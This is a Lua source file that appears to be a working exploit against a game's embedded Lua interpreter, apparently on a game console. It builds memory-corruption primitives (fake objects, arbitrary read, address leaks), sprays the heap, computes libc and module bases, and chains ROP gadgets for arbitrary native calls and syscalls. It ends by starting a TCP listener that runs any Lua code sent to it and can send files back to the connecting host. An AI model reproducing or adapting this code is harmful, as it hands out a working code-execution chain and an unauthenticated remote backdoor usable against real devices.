-- Uint64 helpers
Uint64 = {}
Uint64.__index = Uint64

function Uint64:__tostring()
    local str = ""
    if self.hi ~= 0 then
        str = str .. string.format("%x", self.hi)
    end
    str = str .. string.format("%08x", self.lo)
    return str
end

-- NOTE this will only be called for objects with the same metatable
-- this sucks because it means we will not get an error if we accidentally compare a number to a Uint64
function Uint64:__eq(b)
    return self.lo == b.lo and self.hi == b.hi
end

function force_Uint64(obj)
    if type(obj) == 'number' then
        return Uint64:new(obj)
    elseif Uint64.bad(obj) then
        error('trying to make Uint64 from '..type(obj))
    end
    return obj
end

function Uint64:__lt(b)
    self, b = force_Uint64(self), force_Uint64(b)
    return self.hi < b.hi or (self.hi == b.hi and self.lo < b.lo)
end

function Uint64:__add(b)
    self, b = force_Uint64(self), force_Uint64(b)
    local alo, ahi = self.lo, self.hi
    local blo, bhi = b.lo, b.hi
    alo = alo + blo
    if alo >= 0x100000000 then
        alo = alo - 0x100000000
        ahi = ahi + 1
        if ahi >= 0x100000000 then
            ahi = ahi - 0x100000000
        end
    end
    ahi = ahi + bhi
    if ahi >= 0x100000000 then
        ahi = ahi - 0x100000000
    end
    return Uint64:new(alo, ahi)
end

function Uint64:__sub(b)
    self, b = force_Uint64(self), force_Uint64(b)
    local bhex = string.format("%08x%08x", b.hi, b.lo)
    local bhex_inv = ""
    for i = 1,16,1 do
        local nibble = tonumber("0" .. string.sub(bhex, i, i), 16)
        bhex_inv = bhex_inv .. string.format("%x", 15 - nibble)
    end
    local hi = string.sub(bhex_inv, 1, 8)
    local lo = string.sub(bhex_inv, 9, 16)
    return self + Uint64:new(tonumber(lo, 16), tonumber(hi, 16)) + 1
end

function Uint64:new(lo, hi)
    local num = {
        lo = lo or 0,
        hi = hi or 0
    }
    setmetatable(num, Uint64)
    return num
end

function Uint64:from_number(lo)
    return Uint64:new(lo)
end

function Uint64:from_double(x)
    if x == 0 then return Uint64:new() end
    if x < 0 then x = -x end
    local e_lo, e_hi, e, m = -1075, 1023
    while true do
        e = (e_lo + e_hi)
        e = (e - (e % 2)) / 2
        m = x / 2^e
        if m < 0.5 then e_hi = e elseif 1 <= m then e_lo = e else break end
    end
    if e+1023 <= 1 then
        m = m * 2^(e+1074)
        e = 0
    else
        m = (m - 0.5) * 2^53
        e = e + 1022
    end
    local lo = m % 2^32
    m = (m - lo) / 2^32
    local hi = m + e * 2^20
    return Uint64:new(lo, hi)
end

function Uint64:to_double()
    lo = self.lo
    hi = self.hi
    local m = hi % 2^20
    local e = (hi - m) / 2^20
    m = m * 2^32 + lo
    if e ~= 0 then
        m = m + 2^52
    else
        e = 1
    end
    return m * 2^(e-1075)
end

function Uint64:bad()
    return self.lo == nil or self.hi == nil
end

function Uint64:negative_s64()
    return self.hi >= 0x80000000
end

function Uint64:negative_s32()
    return self.lo >= 0x80000000
end

function Uint64:is_zero()
    return self.hi == 0 and self.lo == 0
end

-- Hex/String helpers
function string.fromhex(str)
    return (str:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

function string.tohex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c))
    end))
end

function string.starts(s, prefix)
    return string.sub(s, 1, string.len(prefix)) == prefix
end

ub2 = function(x)
    local b0 = x % 256; x = (x - b0) / 256
    local b1 = x % 256
    return string.char(b0, b1)
end

ub4 = function(x)
    local b0 = x % 256; x = (x - b0) / 256
    local b1 = x % 256; x = (x - b1) / 256
    local b2 = x % 256; x = (x - b2) / 256
    local b3 = x % 256
    return string.char(b0, b1, b2, b3)
end

ub8 = function(x)
    x = force_Uint64(x)
    return ub4(x.lo) .. ub4(x.hi)
end

-- fakeobj() Primitive
function fakeobj(data)
    return loadstring([[
        local tmp_get = 0
        function get_val(x)
            tmp_get = x
        end
        loadstring(string.dump(function()
                local magic = nil
                local function middle()
                local get_val = get_val
                local lud, upval
                local function inner()
                    fake_tvalue = string.fromhex("]] .. string.tohex(data) .. [[")
                    closure_p = string.fromhex("5152535451525354515253545152535451525354515253545152535451525354")
                    closure_upvals_0 = string.fromhex("22222222222222222222222222222222") .. ub8(addrof_string_payload(fake_tvalue))
                        local closure = string.fromhex("1111111111111111") .. ub8(addrof_string_payload(closure_p)) .. ub8(addrof_string_payload(closure_upvals_0)) .. string.fromhex("1111111111111111")
                        magic = closure
                end
                inner()
                get_val(magic)
                end
            middle()
        end):gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1))()
        return tmp_get
    ]])()
end

-- File IO helpers
function save_text(name, text)
    TheSim:SetPersistentString(name, text, true)
end

function save_binary(name, data)
    save_text(name, string.tohex(data))
end

-- Returns a Uint64 ptr for a FILE userdata
function get_file_ptr(file)
    local file_str = tostring(file)
    local pos_start, pos_end = string.find(file_str, "%(.*%)")
    local file_hex = string.sub(file_str, pos_start+1, pos_end-1)
    local lo = string.sub(file_hex, string.len(file_hex)-7, string.len(file_hex))
    local hi = string.sub(file_hex, 1, string.len(file_hex)-8)
    if hi == "" then hi = "0" end
    return Uint64:new(tonumber(lo, 16), tonumber(hi, 16))
end

-- Returns a Uint64 ptr for a table
function get_obj_ptr(obj)
    local obj_str = tostring(obj)
    local pos_start, pos_end = string.find(obj_str, ": .*")
    local obj_hex = string.sub(obj_str, pos_start+2, pos_end)
    if string.sub(obj_hex, 1, 2) == "0x" then
        obj_hex = string.sub(obj_hex, 3, string.len(obj_hex))
    end
    local lo = string.sub(obj_hex, string.len(obj_hex)-7, string.len(obj_hex))
    local hi = ""
    if string.len(obj_hex) > 8 then
        hi = string.sub(obj_hex, 1, string.len(obj_hex)-8)
    end
    if hi == "" then hi = "0" end
    return Uint64:new(tonumber(lo, 16), tonumber(hi, 16))
end

-- Start of construction
local SPRAY_SIZE = 0x10000
local libc = get_file_ptr(io.stderr) - 0xCCE30

-- we need some data that looks like a lua TSTRING object.
-- It so happens that libc has a string "inappropriate io control operation", which always has the following referencing it:
-- { char *str; u32 four; } str_ptr;, which meets our needs
-- rva of str_ptr
local libc_magic_str_ptr = 0xc9e98
-- rva of "inappropriate io control operation"
local libc_magic_str = 0x9F004
local payload = ub8(libc + libc_magic_str_ptr)

local ptrs = {}
local spray = {}

local random_appends = {}
for i = 1,2*SPRAY_SIZE,1 do
    random_appends[i] = ub4(i) .. string.rep("A", 0x3C - 0x18 - 8 - 4 - 1)
end
collectgarbage()
collectgarbage()
for i = 1,SPRAY_SIZE,1 do
    ptrs[i] = get_obj_ptr({})
end
collectgarbage()
collectgarbage()
for i = 1,2*SPRAY_SIZE,1 do
    spray[i] = payload .. random_appends[i]
end
payload_addr = string.tohex(ub8(ptrs[(2*SPRAY_SIZE) / 4] + 0x18 - 16))

-- Read primitive
local rr_base = libc + libc_magic_str + 0x18

function r(addr, size)
    -- coerce |size| to number or error. honestly not sure why this is required
    if type(size) ~= 'number' then
        if size.hi ~= 0 then error('r passed size > 4G')
        else size = size.lo
        end
    end
    if addr == nil or size == nil or addr < rr_base then
        error('r('..tostring(addr)..','..tostring(size)..') bad addr: '..tostring(addr)..' rr_base: '..tostring(rr_base))
    end
    local pos = addr - rr_base
    local value = loadstring([[
        local tmp_get = 0
        function get_val(x)
            tmp_get = string.sub(x, 0x]] .. tostring(pos+1) .. ", 0x" .. tostring(pos+size) .. [[)
        end
        loadstring(string.dump(function()
            local magic = nil
            local function middle()
                local get_val = get_val
                local lud, upval
                local function inner()
                    local closure = string.fromhex("1111111111111111]] .. payload_addr .. payload_addr .. [[1111111111111111")
                    magic = closure
                end
                inner()
                get_val(magic)
            end
            middle()
        end):gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1))()
        return tmp_get
    ]])()
    local value_len = string.len(value)
    if value_len ~= size then
        error('r('..tostring(addr)..','..tostring(size)..') bad len:'..tostring(value_len))
    end
    return value
end

function r8(addr)
    local val_bytes = r(addr, 1)
    local val_hex = string.tohex(val_bytes)
    local val = string.sub(val_hex, 1, 2)
    return Uint64:new(tonumber(val, 16), 0)
end
function r16(addr)
    local val_bytes = string.reverse(r(addr, 2))
    local val_hex = string.tohex(val_bytes)
    local val = string.sub(val_hex, 1, 4)
    return Uint64:new(tonumber(val, 16), 0)
end
function r32(addr)
    local val_bytes = string.reverse(r(addr, 4))
    local val_hex = string.tohex(val_bytes)
    local val = string.sub(val_hex, 1, 8)
    return Uint64:new(tonumber(val, 16), 0)
end
function r64(addr)
    local val_bytes = string.reverse(r(addr, 8))
    local val_hex = string.tohex(val_bytes)
    local hi = string.sub(val_hex, 1, 8)
    local lo = string.sub(val_hex, 9, 16)
    return Uint64:new(tonumber(lo, 16), tonumber(hi, 16))
end

-- Addrof primitive
function construct_addrof()
    local obj = {}

    return function(x)
        obj[1] = x
        return r64(r64(get_obj_ptr(obj) + 0x18))
    end
end
addrof = construct_addrof()

function addrof_string_payload(x)
    return addrof(x) + 0x18
end

-- Get eboot base
local stack_cookie_ptr = r64(libc + 0xCBA78)
local lk_module_list = stack_cookie_ptr + 0xf210

function text_base_from_lk_index(index)
    return r64(lk_module_list + 0x48 + 0x98 * index)
end

mods = {
    eboot = text_base_from_lk_index(0),
    lk = text_base_from_lk_index(1),
    libc = libc,
}

sym = {
    BroadcastingOptionsMethodCall = mods.eboot + 0x31e80,
    syscall = mods.lk + 0x700 + 7,
    __error = mods.lk + 0x2d80,
    memcpy_s = mods.libc + 0x167C0,
    malloc = mods.libc + 0x1f800,
    free = mods.libc + 0x1f810,
    bzero = mods.libc + 0x32560,
    memcpy = mods.libc + 0x32600,
    memset = mods.libc + 0x32740,
    setContext = mods.libc + 0x544D8,
    getRegs = mods.libc + 0x88B40,
}

gadgets = {
    ret0 = mods.libc + 0x630,
    ret = mods.libc + 0x632,
    popRdi = mods.libc + 0x55DF6,
    popRsi = mods.libc + 0x33381,
    popRdx = mods.libc + 0x51B47,
    popRcx = mods.libc + 0x3331C,
    popRbxPopR12PopR13PopR14PopR15PopRbp = mods.libc + 0xbd,
    writeRaxToRdi = mods.libc + 0x59F1B,
}

Ropper = {}
Ropper.__index = Ropper

function Ropper:new()
    local obj = {
        stack = {}
    }
    setmetatable(obj, Ropper)
    return obj
end

function Ropper:getRopStack()
    local stack_str = ''
    for k, v in pairs(self.stack) do
        stack_str = stack_str .. ub8(v)
    end
    return stack_str
end

function Ropper:writeSlot(val)
    table.insert(self.stack, val)
end

-- Make closure object
function call(func_ptr, ...)
    if func_ptr == nil then error('call: nil func_ptr') end
    if arg.n > 12 then error('call: too many args') end
    for i, v in ipairs(arg) do
        if type(v) == 'number' then arg[i] = Uint64:new(v)
        elseif type(v) == 'string' then arg[i] = addrof_string_payload(v)
        elseif v == nil then error('call: nil explicit arg')
        end
    end

    gbufs = {}

    function call_internal(func, rdi)
        local udata_thunk_descriptor_object = string.fromhex(
            "0000000000000000" .. -- payload, not used
            string.tohex(ub8(func)) .. -- payload, function ptr (setjmp)
            "0000000000000000" .. -- payload, arg0=inner_object+<this offset>
            "")

        local closure_object = string.fromhex(
            "0000000000000000" .. -- gcnext
            "06" .. -- tt
            "00" .. -- marked
            "01" .. -- isC
            "01" .. -- nupvalues
            "00000000" .. -- struct padding
            "0000000000000000" .. -- gclist
            "0000000000000000" .. -- env
            string.tohex(ub8(sym.BroadcastingOptionsMethodCall)) .. -- f
            string.tohex(ub8(addrof_string_payload(udata_thunk_descriptor_object))) .. "02000000" .. -- upvalue 1
            "")

        local closure_tvalue = fakeobj(ub8(addrof_string_payload(closure_object)) .. string.fromhex("06000000"))

        local BroadcastingOptions_metatable_ptr = get_obj_ptr(getmetatable(TheFrontEnd:GetBroadcastingOptions()))

        local udata_object = string.fromhex(
            "0000000000000000" .. -- gcnext
            "07" .. -- tt
            "00" .. -- marked
            "00" .. -- padding
            "00" .. -- padding
            "00000000" .. -- struct padding
            string.tohex(ub8(BroadcastingOptions_metatable_ptr)) .. -- metatable
            "0000000000000000" .. -- env
            "5000000000000000" .. -- len
            string.tohex(ub8(rdi)) ..
            "")

        local udata_tvalue = fakeobj(ub8(addrof_string_payload(udata_object)) .. string.fromhex("07000000"))

        closure_tvalue(udata_tvalue)
    end

    -- arg order: rip, rsp, rdi, rsi, rdx, rcx, r8, r9, r12
    function make_godgadget_buf(...)
        for i=1, 9, 1 do
            if arg[i] == nil then
                if i < 3 then error('must supply rip+rsp') end
                arg[i] = Uint64:new(0)
            elseif type(arg[i]) == 'number' then
                arg[i] = Uint64:new(arg[i])
            end
        end
        local rv = string.fromhex(
            string.rep("00", 0x48) ..
            string.tohex(ub8(arg[3])) ..
            string.tohex(ub8(arg[4])) ..
            string.tohex(ub8(arg[5])) ..
            string.tohex(ub8(arg[6])) ..
            string.tohex(ub8(arg[7])) ..
            string.tohex(ub8(arg[8])) ..
            "0000000000000000" .. -- rax
            "0000000000000000" .. -- rbx
            "0000000000000000" .. -- rbp
            "0000000000000000" .. -- 0x90
            "0000000000000000" .. -- 0x98
            string.tohex(ub8(arg[9])) .. -- r12
            "0000000000000000" .. -- r13
            "0000000000000000" .. -- r14
            "0000000000000000" .. -- r15
            "0000000000000000" .. -- 0xc0
            "0000000000000000" .. -- 0xc8
            "0000000000000000" .. -- 0xd0
            "0000000000000000" .. -- 0xd8
            string.tohex(ub8(arg[1])) .. -- 0xe0 new rip
            "0000000000000000" .. -- 0xe8
            "0000000000000000" .. -- 0xf0
            string.tohex(ub8(arg[2])) .. -- 0xf8 new rsp
            string.rep("00", 0x128 - 0x100) .. -- avoid fxrstor
            "")
        -- insert ref to every created string into some global
        table.insert(gbufs, rv)
        return rv
    end

    local stack_release = {
        gadgets.popRbxPopR12PopR13PopR14PopR15PopRbp + 9,
        gadgets.popRbxPopR12PopR13PopR14PopR15PopRbp + 7,
        gadgets.popRbxPopR12PopR13PopR14PopR15PopRbp + 5,
        gadgets.popRbxPopR12PopR13PopR14PopR15PopRbp + 3,
        gadgets.popRbxPopR12PopR13PopR14PopR15PopRbp + 1,
        gadgets.popRbxPopR12PopR13PopR14PopR15PopRbp
    }

    -- Call setjmp (or whatever) to get regs
    gbufs.regdump = string.fromhex(string.rep('00', 0x100))
    local regdump_addr = addrof_string_payload(gbufs.regdump)
    call_internal(sym.getRegs, regdump_addr)
    local rsp_saved = r64(regdump_addr + 0x10)
    local r12_saved = r64(regdump_addr + 0x20)

    local ropstack_addr = rsp_saved - 0x2000

    local rop = Ropper:new()
    -- do the actual arb call
    rop:writeSlot(gadgets.popRdi)
    rop:writeSlot(addrof_string_payload(make_godgadget_buf(func_ptr, ropstack_addr + 8 * 3,
        arg[1], arg[2], arg[3], arg[4], arg[5], arg[6])))
    rop:writeSlot(sym.setContext)
    if arg.n > 6 then rop:writeSlot(stack_release[arg.n - 6]) end
    for i=7, arg.n, 1 do rop:writeSlot(arg[i]) end
    -- save rax (reuses setjmp buf)
    rop:writeSlot(gadgets.popRdi)
    rop:writeSlot(regdump_addr)
    rop:writeSlot(gadgets.writeRaxToRdi)
    -- restore regs we care about (rip, rsp, r12), set rax=0
    rop:writeSlot(gadgets.popRdi)
    rop:writeSlot(addrof_string_payload(make_godgadget_buf(gadgets.ret0, rsp_saved,
        0, 0, 0, 0, 0, 0, r12_saved)))
    rop:writeSlot(sym.setContext)

    -- Use the GodGadget (tm)
    -- call memcpy_s first to place the ropstack, then return to it
    local ropstack = rop:getRopStack()
    gbufs.ropstack = ropstack
    local ropstack_len = string.len(ropstack)
    local ctx = make_godgadget_buf(sym.memcpy_s, rsp_saved,
        ropstack_addr, ropstack_len, addrof_string_payload(ropstack), ropstack_len, 0, 0,
        r12_saved)
    call_internal(sym.setContext, addrof_string_payload(ctx))
    --[[ should only be needed for debug
    local readback = r(ropstack_addr, ropstack_len)
    for i=1, ropstack_len, 1 do
        if ropstack[i] ~= readback[i] then
            error('write ropstack failed')
        end
    end
    --]]

    -- exec ropstack
    call_internal(sym.setContext, addrof_string_payload(make_godgadget_buf(gadgets.ret, ropstack_addr)))

    --[[ not sure if this is needed ]]
    gbufs_force_keep = ''
    for k,v in pairs(gbufs) do
        gbufs_force_keep = gbufs_force_keep .. v
    end
    --]]

    local rax = r64(regdump_addr)
    return rax
end

function errno()
    return r32(call(sym.__error)).lo
end

function c_str(str)
    return str .. string.char(0)
end

O_DIRECTORY = 0x00020000
PF_INET = 2
AF_INET = PF_INET
SOCK_STREAM = 1
SOL_SOCKET = 0xffff
SO_REUSEADDR = 0x0004
SO_KEEPALIVE = 0x0008
SO_REUSEPORT = 0x0200
SO_SNDTIMEO = 0x1005
SO_RCVTIMEO = 0x1006
MSG_WAITALL = 0x40

function malloc(size)
    local addr = call(sym.malloc, size)
    if addr:is_zero() then error('malloc failed') end
    call(sym.bzero, addr, size)
    return addr
end

function free(addr)
    return call(sym.free, addr)
end

function memcpy(dst, src, len)
    return call(sym.memcpy, dst, src, len)
end

function read(fd, buf, nbyte)
    return call(sym.syscall, 3, fd, buf, nbyte)
end

function write(fd, buf, nbyte)
    return call(sym.syscall, 4, fd, buf, nbyte)
end

function open(path, flags, mode)
    return call(sym.syscall, 5, c_str(path), flags, mode)
end

function close(fd)
    return call(sym.syscall, 6, fd)
end

function accept(s, name, anamelen)
    return call(sym.syscall, 30, s, name, anamelen)
end

function socket(domain, type, protocol)
    return call(sym.syscall, 97, domain, type, protocol)
end

function connect(s, name, namelen)
    return call(sym.syscall, 98, s, name, namelen)
end

function send(s, buf, len, flags)
    return call(sym.syscall, 101, s, buf, len, flags)
end

function recv(s, buf, len, flags)
    return call(sym.syscall, 102, s, buf, len, flags)
end

function bind(s, name, namelen)
    return call(sym.syscall, 104, s, name, namelen)
end

function setsockopt(s, level, name, val, valsize)
    return call(sym.syscall, 105, s, level, name, val, valsize)
end

function listen(s, backlog)
    return call(sym.syscall, 106, s, backlog)
end

function getdents(fd, buf, count)
    return call(sym.syscall, 272, fd, buf, count)
end

function randomized_path(new_path, old_path, old_path_len)
    return call(sym.syscall, 602, new_path, old_path, old_path_len)
end

function _xfer_all(fd, buf, len, func)
    if type(buf) == 'string' then buf = addrof_string_payload(buf) end
    local XFER_GC_LIMIT = 10
    local counter = XFER_GC_LIMIT
    len = force_Uint64(len)
    while not len:is_zero() do
        local done = func(fd, buf, len)
        if done:negative_s64() then return false end
        buf = buf + done
        len = len - done
        counter = counter - 1
        if counter == 0 then
            counter = XFER_GC_LIMIT
            collectgarbage()
        end
    end
    return true
end

function read_all(fd, buf, len)
    return _xfer_all(fd, buf, len, read)
end

function write_all(fd, buf, len)
    return _xfer_all(fd, buf, len, write)
end

function file_read(path)
    local file = io.open('..'..path, 'rb')
    if not file then return nil end
    local data = file:read('*a')
    file:close()
    return data
end

tcp_host_addr = nil

function tcp_host_set(sockaddr, port)
    local ip = string.tohex(r(sockaddr + 4, 4))
    tcp_host_addr = make_sockaddr(ip, port)
end

function tcp_host_open()
    if not tcp_host_addr then return nil end

    local fd = socket(PF_INET, SOCK_STREAM, 0)
    if fd:negative_s64() then return nil end

    local rv = connect(fd, tcp_host_addr, #tcp_host_addr)
    if rv:negative_s64() then
        close(fd)
        return nil
    end
    return fd
end

local CMD_UPLOAD_FILE = 0
local CMD_DOWNLOAD_FILE = 1
local CMD_LOG_TEXT = 2
local CMD_EXEC_LUA = 3
local CMD_EXIT = 4

function tcp_fmt_sized(buf)
    return ub4(#buf)..buf
end

function tcp_file_write(path, buf)
    local fd = tcp_host_open()
    if not fd then return false end

    local cmd = ub4(CMD_UPLOAD_FILE)..tcp_fmt_sized(path)..tcp_fmt_sized(buf)
    local rv = write_all(fd, cmd, #cmd)
    close(fd)
    return rv
end

function tcp_file_write_mem(path, buf, len)
    local fd = tcp_host_open()
    if not fd then return false end

    local len = force_Uint64(len).lo

    local CMD_UPLOAD_FILE = 0
    local cmd = ub4(CMD_UPLOAD_FILE)..tcp_fmt_sized(path)..ub4(len)
    local rv = write_all(fd, cmd, #cmd)
    if rv then rv = write_all(fd, buf, len) end
    close(fd)
    return rv
end

function log(msg)
    local fd = tcp_host_open()
    if not fd then return false end

    local cmd = ub4(CMD_LOG_TEXT)..tcp_fmt_sized(msg)
    local rv = write_all(fd, cmd, #cmd)
    close(fd)
    return rv
end

function log_err(msg)
    msg = msg..' '..tostring(errno())
    if not log(msg) then error(msg) end
end

function parse_dirent_record(buf)
    local namelen = r8(buf + 7)
    return {
        d_fileno = r32(buf),
        d_reclen = r16(buf + 4),
        d_type = r8(buf + 6),
        d_namelen = namelen,
        d_name = r(buf + 8, namelen.lo)
    }
end

function record_typename(record)
    local record_types = {
        DT_UNKNOWN = 0,
        DT_FIFO = 1,
        DT_CHR  = 2,
        DT_DIR  = 4,
        DT_BLK  = 6,
        DT_REG  = 8,
        DT_LNK  = 10,
        DT_SOCK = 12,
        DT_WHT  = 14
    }
    for k, v in pairs(record_types) do
        if v == record.d_type.lo then return k end
    end
    return 'unknown_'..tostring(record.d_type)
end

function iter_dirents(path, callback, err_cb, depth)
    local fd = open(path, O_DIRECTORY, 0)
    if fd:negative_s64() then
        if err_cb then err_cb('open', path, errno())
        else log_err('open failed '..path) end
        return
    end

    local buf_len = 0x10000
    local buf = malloc(buf_len)
    local rv = getdents(fd, buf, buf_len)
    if rv:negative_s64() then
        if err_cb then err_cb('getdents', path, errno())
        else log_err('getdents failed '..path) end
        return
    end
    local depth = depth or 0
    callback(path, buf, rv, err_cb, depth)
    close(fd)
    free(buf)
end

-- this should take more sensible form of input but im lazy
function make_sockaddr(addr, port)
    -- sockaddr_in { u8 sin_len; u8 sin_family; u16 sin_port; u32 sin_addr; u8 sin_zero[8] }
    return string.fromhex('10'..'02'..port..addr..string.rep('00', 8))
end

function make_timeval(seconds, usecs)
    -- { s64 tv_sec; s64 tv_usec; }
    return ub8(seconds)..ub8(usecs)
end

function tcp_server_loop()
    local server_fd = socket(PF_INET, SOCK_STREAM, 0)
    if server_fd:negative_s64() then log_err('socket') return false end

    local enable = ub4(1)
    local rv = setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, enable, #enable)
    if rv:negative_s64() then log_err('SO_REUSEADDR') return false end

    local timeout = make_timeval(3, 0)
    rv = setsockopt(server_fd, SOL_SOCKET, SO_SNDTIMEO, timeout, #timeout)
    if rv:negative_s64() then log_err('SO_SNDTIMEO') return false end
    rv = setsockopt(server_fd, SOL_SOCKET, SO_RCVTIMEO, timeout, #timeout)
    if rv:negative_s64() then log_err('SO_RCVTIMEO') return false end

    -- INADDR_ANY:6667
    local server_addr = make_sockaddr('00000000', '1a0b')
    rv = bind(server_fd, server_addr, #server_addr)
    if rv:negative_s64() then log_err('bind') return false end

    rv = listen(server_fd, 1)
    if rv:negative_s64() then log_err('listen') return false end

    local sockaddr_len = #server_addr
    local scratch = malloc(4 + sockaddr_len + 0x100)
    local p_client_len = scratch
    local client_addr = p_client_len + 4
    local cmd_scratch = client_addr + sockaddr_len

    local exiting = false
    while true do
        memcpy(p_client_len, ub4(sockaddr_len), 4)
        local fd = accept(server_fd, client_addr, p_client_len)
        if not fd:negative_s64() then
            -- set logger to point back to whatever connected to us on port 6666
            tcp_host_set(client_addr, '1a0a')

            local recv_ok = read_all(fd, cmd_scratch, 4)
            if not recv_ok then break end

            local cmd = r32(cmd_scratch).lo
            if cmd == CMD_EXEC_LUA then
                recv_ok = read_all(fd, cmd_scratch, 4)
                if not recv_ok then break end

                local buf_len = r32(cmd_scratch).lo
                local lua_buf = malloc(buf_len)
                recv_ok = read_all(fd, lua_buf, buf_len)
                if not recv_ok then break end

                local status, err = pcall(loadstring(r(lua_buf, buf_len)))
                if not status then log('exec lua failed: '..err) end
                free(lua_buf)
                collectgarbage()
            elseif cmd == CMD_EXIT then
                -- it would be nice to find a way to relaunch the app
                exiting = true
                break
            end

            close(fd)
        else
            if errno() == 163 then
                -- this is some error that occurs when network is reconnected
                -- seems we must recreate server in that case
                break
            end
            log_err('accept')
        end
    end

    free(scratch)
    close(server_fd)
    return exiting
end

function tcp_server()
    local exiting = false
    while not exiting do
        log('starting server...')
        exiting = tcp_server_loop()
    end
end

tcp_server()
